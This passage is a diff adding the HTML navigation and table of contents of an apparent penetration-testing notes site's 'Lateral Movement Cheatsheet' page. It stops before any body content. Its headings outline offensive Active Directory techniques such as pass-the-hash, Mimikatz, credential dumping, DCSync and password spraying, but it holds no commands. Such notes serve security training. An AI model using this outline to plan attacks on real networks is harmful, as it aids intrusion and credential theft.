@@ -1,0 +1,4974 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../inital-enum/">
+      
+      
+        <link rel="next" href="../ldap-queries/">
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.18">
+    
+    
+      
+        <title>Lateral Movement Cheatsheet - Hack Mastery</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.7e37652d.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#lateral-movement-cheatsheet" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Hack Mastery" class="md-header__button md-logo" aria-label="Hack Mastery" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Hack Mastery
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Lateral Movement Cheatsheet
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Hack Mastery" class="md-nav__button md-logo" aria-label="Hack Mastery" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Hack Mastery
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Welcome to MkDocs
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../exiftool/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Exiftool
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../exploit-helper/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Helpul things for public exploits
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../helpfull-tips/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    SSH with commandline enable
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../init-enum/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Inital Enumeration
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ligolo/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Ligolo-ng Usage
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../takeaway/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Takeaway From the reports I found
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tmux/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Tmux Usage
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    AD
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_9">
+            <span class="md-nav__icon md-icon"></span>
+            AD
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../AD-Enumeration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Active Directory Reconnaissance
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../add-user-to-group/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Change User Groups
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../bloodhound/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Bloodhound Stuff
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../data-issues/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Sync Date with DC
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../dcsync/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    DCSync Attack
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../force-change-password/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Force Change Password
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../generate-ntlm/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Generate NTLM Hash
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../gpo/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Abuse Windows GPO
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../inital-enum/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Inital Enumration
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    Lateral Movement Cheatsheet
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    Lateral Movement Cheatsheet
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      Overview
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#prerequisites" class="md-nav__link">
+    <span class="md-ellipsis">
+      Prerequisites
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Prerequisites">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#what-you-need" class="md-nav__link">
+    <span class="md-ellipsis">
+      What You Need
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#credential-types" class="md-nav__link">
+    <span class="md-ellipsis">
+      Credential Types
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#psexec" class="md-nav__link">
+    <span class="md-ellipsis">
+      PsExec
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="PsExec">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#using-sysinternals-psexec" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using Sysinternals PsExec
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-impacket-psexec" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using Impacket PsExec
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#wmi-windows-management-instrumentation" class="md-nav__link">
+    <span class="md-ellipsis">
+      WMI (Windows Management Instrumentation)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="WMI (Windows Management Instrumentation)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#using-wmic" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using WMIC
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-impacket-wmiexec" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using Impacket WMIExec
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-powershell-wmi" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using PowerShell WMI
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#winrm-windows-remote-management" class="md-nav__link">
+    <span class="md-ellipsis">
+      WinRM (Windows Remote Management)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="WinRM (Windows Remote Management)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#using-powershell-remoting" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using PowerShell Remoting
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-evil-winrm" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using Evil-WinRM
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#smb-server-message-block" class="md-nav__link">
+    <span class="md-ellipsis">
+      SMB (Server Message Block)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="SMB (Server Message Block)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#using-smbclient" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using smbclient
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-impacket-smbexec" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using Impacket SMBExec
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#mounting-smb-shares" class="md-nav__link">
+    <span class="md-ellipsis">
+      Mounting SMB Shares
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#rdp-remote-desktop-protocol" class="md-nav__link">
+    <span class="md-ellipsis">
+      RDP (Remote Desktop Protocol)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="RDP (Remote Desktop Protocol)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#using-xfreerdp" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using xfreerdp
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-rdesktop" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using rdesktop
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pass-the-hash-pth" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pass-the-Hash (PTH)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Pass-the-Hash (PTH)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#using-impacket-tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using Impacket Tools
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-crackmapexec" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using CrackMapExec
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-mimikatz-pth" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using Mimikatz PTH
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dcom-distributed-component-object-model" class="md-nav__link">
+    <span class="md-ellipsis">
+      DCOM (Distributed Component Object Model)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="DCOM (Distributed Component Object Model)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#using-impacket-dcomexec" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using Impacket DcomExec
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-powershell-dcom" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using PowerShell DCOM
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#scheduled-tasks" class="md-nav__link">
+    <span class="md-ellipsis">
+      Scheduled Tasks
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Scheduled Tasks">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#using-schtasks" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using schtasks
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-impacket-atexec" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using Impacket AtExec
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#windows-services" class="md-nav__link">
+    <span class="md-ellipsis">
+      Windows Services
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Windows Services">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#using-scexe" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using sc.exe
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-powershell" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using PowerShell
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#crackmapexec-swiss-army-knife" class="md-nav__link">
+    <span class="md-ellipsis">
+      CrackMapExec (Swiss Army Knife)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="CrackMapExec (Swiss Army Knife)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#basic-usage" class="md-nav__link">
+    <span class="md-ellipsis">
+      Basic Usage
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#command-execution" class="md-nav__link">
+    <span class="md-ellipsis">
+      Command Execution
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#credential-dumping" class="md-nav__link">
+    <span class="md-ellipsis">
+      Credential Dumping
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#module-usage" class="md-nav__link">
+    <span class="md-ellipsis">
+      Module Usage
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#remote-registry" class="md-nav__link">
+    <span class="md-ellipsis">
+      Remote Registry
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Remote Registry">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#using-regexe" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using reg.exe
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-powershell_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using PowerShell
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#lateral-movement-with-credentials" class="md-nav__link">
+    <span class="md-ellipsis">
+      Lateral Movement with Credentials
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Lateral Movement with Credentials">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#credential-formats" class="md-nav__link">
+    <span class="md-ellipsis">
+      Credential Formats
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#quick-lateral-movement" class="md-nav__link">
+    <span class="md-ellipsis">
+      Quick Lateral Movement
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exam-scenarios" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exam Scenarios
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exam Scenarios">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#scenario-1-you-have-password" class="md-nav__link">
+    <span class="md-ellipsis">
+      Scenario 1: You Have Password
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#scenario-2-you-have-ntlm-hash" class="md-nav__link">
+    <span class="md-ellipsis">
+      Scenario 2: You Have NTLM Hash
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#scenario-3-pivot-through-multiple-hosts" class="md-nav__link">
+    <span class="md-ellipsis">
+      Scenario 3: Pivot Through Multiple Hosts
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#scenario-4-spray-and-move" class="md-nav__link">
+    <span class="md-ellipsis">
+      Scenario 4: Spray and Move
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#quick-reference" class="md-nav__link">
+    <span class="md-ellipsis">
+      Quick Reference
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Quick Reference">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#essential-commands" class="md-nav__link">
+    <span class="md-ellipsis">
+      Essential Commands
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tool-selection-guide" class="md-nav__link">
+    <span class="md-ellipsis">
+      Tool Selection Guide
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pro-tips" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pro Tips
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#troubleshooting" class="md-nav__link">
+    <span class="md-ellipsis">
+      Troubleshooting
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Troubleshooting">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#common-issues" class="md-nav__link">
+    <span class="md-ellipsis">
+      Common Issues
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#resources" class="md-nav__link">
+    <span class="md-ellipsis">
+      Resources
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#summary" class="md-nav__link">
+    <span class="md-ellipsis">
+      Summary
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Summary">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#most-common-lateral-movement-commands" class="md-nav__link">
+    <span class="md-ellipsis">
+      Most Common Lateral Movement Commands
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#lateral-movement-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      Lateral Movement Flow
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#remember" class="md-nav__link">
+    <span class="md-ellipsis">
+      Remember
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ldap-queries/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    LDAP Queries
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../mimkitz/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Mimikatz Cheatsheet
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ntlm/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    NTLM Relay Attack
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../smb-hash-theft/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Grab Hash using NTLM
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_10" >
+        
+          
+          <label class="md-nav__link" for="__nav_10" id="__nav_10_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Exploits
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_10_label" aria-expanded="false">
